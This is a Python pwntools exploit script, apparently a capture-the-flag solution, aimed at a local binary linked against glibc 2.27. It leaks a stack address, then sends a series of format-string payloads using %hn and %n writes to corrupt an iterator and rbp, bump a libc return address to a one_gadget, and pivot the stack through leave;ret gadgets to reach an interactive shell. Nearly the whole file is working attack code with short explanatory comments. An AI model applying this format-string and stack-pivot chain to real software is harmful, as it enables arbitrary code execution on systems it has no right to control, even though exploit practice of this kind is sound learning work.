#!/usr/bin/env python3

from pwn import *

exe = ELF("./a.out")
libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
        return process(exe.path, env={"LD_PRELOAD": libc.path})

def s(num):
    return str(num).encode()

def main():
    r = conn()

    r.sendlineafter(": ", "M")
    r.sendafter(": ", "y")
    r.recvuntil("Your age is ")
    stack = int(r.recvuntil(",")[:-1:])
    log.warn("stack leak @ 0x%x", stack)

    # Get a lot of fprintf, by changing i in the stack (iterator).
    # when aslr is off 
    # 0x00007fffffffec68â”‚+0x0010: 0x00000001554008e0
    # Which is at fixed offset from the leak. 0x7fffffffed80
    
    i = stack - 0x112
    
    payload  = b"%c"*14 + b"%" +s((i & 0xffff) - 14) + b"c"
    payload += b"%hn"
    payload += b"%" + s(0xffff - (i & 0xffff)) + b"c"
    payload += b"%42$hn"
    payload = payload.ljust(0x7e, b"M")

    r.sendline(payload)
    
    
    # Here we want to change rbp to a libc address in the stack
    # __libc_start_main+231
    # We will increment it to have one_gadget address and pivot to it.
    rbp   = stack - 0x110 - 0x8
    pivot = stack - 0xd8

    payload  = b"%c"*14 + b"%" + s((rbp & 0xffff) - 14) + b"c"
    payload += b"%hn"
    payload += b"%" + s((((pivot & 0xffff) - (rbp & 0xffff)) & 0xffff))+ b"c"
    payload += b"%42$hn"
    payload = payload.ljust(0x7e, b"M")
    
    r.sendline(payload)

    # Now that we have rbp pointing
    # To our libc address, we need to increment it
    # and have it one gadget.
    offset = 0x2d7de

    payload  = b"%c"*14 + b"%" + s((pivot & 0xffff) - 14) + b"c"
    payload += b"%hn"
    payload += b"%"+ s(((offset) - (pivot & 0xffff))) + b"c%*14$c"
    payload += b"%42$n"
    payload = payload.ljust(0x7e, b"M")

    r.sendline(payload)

    # I will try to execute two leave returns.
    # I will modify the one at stack-0x100 first
    # Then target fprintf return value.

    second_r = stack - 0x100 - 0x8
    leave_ret = 0x0a48

    payload  = b"%c"*14 + b"%" + s((second_r & 0xffff) - 14) + b"c"
    payload += b"%hn"
    payload += b"%" + s((0xffff - (second_r & 0xffff)) + leave_ret + 1) + b"c"
    payload += b"%42$hn"
    payload = payload.ljust(0x7e, b"M")
    r.sendline(payload)

    # Last format string to execute
    # This time we're targeting the fprintf return value.
    return_v = stack - 0x128

    payload  = b"%c"*14 + b"%" + s((return_v & 0xffff) - 14) + b"c"
    payload += b"%hn"
    payload += b"%" + s(0xff - (return_v & 0xff) + 0x48 + 1) + b"c"
    payload += b"%42$hhn"
    payload = payload.ljust(0x7e, b"M")
    
    r.sendline(payload)
    r.interactive()



if __name__ == "__main__":
    main()
